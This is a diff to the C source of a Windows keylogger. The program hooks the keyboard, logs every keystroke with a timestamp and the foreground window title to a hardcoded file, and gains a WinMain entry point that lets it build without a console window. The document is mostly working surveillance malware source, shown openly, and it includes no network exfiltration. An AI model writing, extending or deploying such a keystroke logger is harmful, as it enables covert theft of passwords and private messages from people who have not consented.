@@ -15,9 +15,13 @@
 #define WINDOW_CLASS_NAME L"Winkey Window Class"
 #include <windows.h>
 #include <stdio.h>
+#include <Share.h>
 #pragma comment(lib, "user32.lib")
 #pragma warning(disable: 5045)
 
+#include "error.c"
+
+#define LOG_PATH "C:\\Users\\Zekao\\Documents\\log.txt"
 
 // This keyboard hook needs to remain global because we will reuse it within the hook callback.
 HHOOK keyboard_hook = NULL; 
@@ -28,26 +32,14 @@ HWND hwnd = NULL;  // The handle to the window created to received keyboard mess
 char const *key_saved = NULL;
 
 FILE *file;
-char output[1024];
 
-static inline int to_utf8(wchar_t const *utf16, size_t utf16_len, char *utf8, size_t utf8_len)
+static inline size_t to_utf8(wchar_t const *utf16, size_t utf16_len, char *utf8, size_t utf8_len)
 {
     /**
      * Converts an UTF-16 buffer into an UTF-8 buffer.
      */
     
-    return WideCharToMultiByte(CP_UTF8, 0, utf16, utf16_len, utf8, utf8_len, NULL, NULL);
-}
-
-static void print_last_error(char const *message)
-{
-    /**
-     * Writes an appropriate error message for the calling thread's
-     * last error code.
-     */
-     
-    DWORD code = GetLastError();
-    fprintf(stderr, "%s: no error message (error code %d)\n", message, (int)code);
+    return (size_t)WideCharToMultiByte(CP_UTF8, 0, utf16, (int)utf16_len, utf8, (int)utf8_len, NULL, NULL);
 }
 
 static void log_key(char const *key, char const *c)
@@ -79,7 +71,7 @@ static void log_key(char const *key, char const *c)
         int count_utf16 = GetWindowTextW(forground_hwnd, window_title_utf16, 128);
         if (count_utf16 != 0)
         {
-            int count_utf8 = to_utf8(window_title_utf16, count_utf16, window_title_utf8, 255);
+            int count_utf8 = (int)to_utf8(window_title_utf16, count_utf16, window_title_utf8, 255);
             if (count_utf8 == 0)
                 strcpy(window_title_utf8, "unknown");
             else
@@ -87,17 +79,13 @@ static void log_key(char const *key, char const *c)
         }
     }
 
-    sprintf(
-        output,
+    fprintf(
+        file,
         "[%02d:%02d:%02d.%03d] <%s> => %s %s\n",
         system_time.wHour, system_time.wMinute,
         system_time.wSecond, system_time.wMilliseconds,
         window_title_utf8, key, c);
-
-    if (output) {
-        fwrite(output, 1, strlen(output), file);
-        fflush(file);
-    }
+    fflush(file);
 }
 
 static void received_character(wchar_t *utf16, size_t utf16_len)
@@ -112,7 +100,7 @@ static void received_character(wchar_t *utf16, size_t utf16_len)
     char utf8[5];
     
     // Convert the characters into UTF-8.
-    int count = to_utf8(utf16, utf16_len, utf8, 4);
+    int count = (int)to_utf8(utf16, utf16_len, utf8, 4);
     if (count == 0)
         return;
 
@@ -402,7 +390,7 @@ static LRESULT CALLBACK wndproc(HWND hwnd_, UINT msg, WPARAM wparam, LPARAM lpar
     }
 }
 
-int CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam)
+LRESULT CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam)
 {
     if (code < 0)
         return CallNextHookEx(keyboard_hook, code, wparam, lparam);
@@ -415,21 +403,20 @@ int CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam)
 
     key_saved = get_key_name((USHORT)info->vkCode);
 
-    PostMessageW(hwnd, wparam, info->vkCode, 0);
+    PostMessageW(hwnd, (UINT)wparam, info->vkCode, 0);
 
     return 0;
 }
 
 int main(void)
 {
-    char path[MAX_PATH];
-    GetModuleFileNameA(NULL, path, MAX_PATH);
-    char *last_slash = strrchr(path, '\\');
-    if (last_slash)
-        *last_slash = '\0';
+    file = _fsopen(LOG_PATH, "a+", _SH_DENYNO);
+    if (!file)
+    {
+        print_last_error("Failed to open the log file");
+        return 1;
+    }
 
-    file = fopen(strcat(path, "\\log.txt"), "w");
-    // Get the HINSTANCE of the running process.
     HINSTANCE hinstance = GetModuleHandleW(NULL);
 
     if (!hinstance)
@@ -441,6 +428,7 @@ int main(void)
     // Register the window class.
     // We need a window class in order to create a window in the first place.
 
+    
     WNDCLASSEXW class_info;
     ZeroMemory(&class_info, sizeof(class_info));
     class_info.cbSize = sizeof(class_info);
@@ -505,4 +493,17 @@ int main(void)
             log_key(key_saved, NULL);
         }
     }
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+                   LPSTR lpCmdLine, int nCmdShow)
+{
+    (void)hInstance;
+    (void)hPrevInstance;
+    (void)lpCmdLine;
+    (void)nCmdShow;
+    main();
+
+    return 0;
 }
